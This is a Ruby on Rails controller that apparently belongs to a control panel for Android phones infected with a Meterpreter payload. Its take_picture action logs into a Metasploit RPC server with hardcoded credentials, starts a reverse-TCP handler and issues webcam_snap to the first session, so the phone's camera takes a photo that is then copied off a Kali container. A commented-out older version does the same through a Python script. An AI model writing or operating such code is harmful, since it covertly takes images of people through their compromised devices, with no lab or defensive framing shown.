class PicturesController < InheritedResources::Base
    # def take_picture
    #     require 'date'
    #     current_time = DateTime.now
    #     fileName= "picture_" + current_time.strftime("%d_%m_%Y_%H_%M") + '.jpeg'
    #     if params[:smartphone_id].present?
    #         puts "yees"
    #         @smartphone = Smartphone.find(params[:smartphone_id])
    #         @apk_installation = ApkInstallation.find(@smartphone.apk_installation_id)
    #         @apk_payload = ApkPayload.find(@apk_installation.apk_payload_id)
        
    #         webcaSnapCommand="docker exec -u 0 kali_container sh -c \"/usr/bin/python /root/webcam_snap.py #{@apk_payload.destination_ip} #{@apk_payload.destination_port} 100 1 #{fileName}\""
    #         copyPictureCommand="docker cp kali_container:/#{fileName} files\\pictures\\#{fileName}"

    #         puts webcaSnapCommand
    #         system(webcaSnapCommand)
    #         system(copyPictureCommand)

    #         message=""
    #         fullPath="files\\pictures\\" + fileName
    #         if File.file?(fullPath)
    #             newPicture=Picture.new(:date => '2003-05-03 00:00:00',:filename => fileName, :smartphone_id => @smartphone.id)
    #             newPicture.save!
    #             message="Picture Taken! Path: " + fullPath
    #         else
    #             message="Could not take picture. Please try again.."
    #         end 
    #         redirect_to controller: 'admin/dashboard', action: 'index', selected_smartphone_id: @smartphone.id
    #     else
    #         puts "noo"
    #     end
    # end


    def take_picture
        require 'msfrpc-client'

        user = 'cool'
        pass = 'looc'
        
        opts = {
          host: '127.0.0.1',
          port: 3333,
          uri:  '/api/',
          ssl:  true
        }
        rpc = Msf::RPC::Client.new(opts)
        rpc.login(user, pass)
        
        opts = {
          host: '127.0.0.1',
          port: 3333,
          uri:  '/api/',
          ssl:  true
        }
        
        pay_opts = {
          'PAYLOAD' => 'android/meterpreter/reverse_tcp',
          'LHOST'   => '0.0.0.0',
          'LPORT'   => 4444
        }
        job = rpc.call('module.execute', 'exploit', 'multi/handler', pay_opts)
        
        session=rpc.call('session.list').keys[0]
        require 'date'
        current_time = DateTime.now
        @file_name= "picture_" + current_time.strftime("%d_%m_%Y_%H_%M_%S") + '.jpeg'
        puts @file_name
        puts rpc.call('session.meterpreter_write', session, "webcam_snap -q 100 -i 1 -p #{@file_name}")
        sleep 2
        commandOutput = rpc.call('session.meterpreter_read', session).values()[0].split('\n')
        while not system("docker exec kali_container ls | grep #{@file_name}") do
            puts "Waiting ..."
        end
        copyPictureCommand="docker cp kali_container:/#{@file_name} app\\assets\\images\\files\\pictures\\#{@file_name}"
        system(copyPictureCommand)
        puts @file_name
        respond_to do |format|
            format.js { render "take_picture", :locals => {:commandOutput => commandOutput, :fileName => @file_name}  }
          end


    end




  private

    def picture_params
      params.require(:picture).permit(:date, :duration, :filename, :smartphone_id)
    end

end
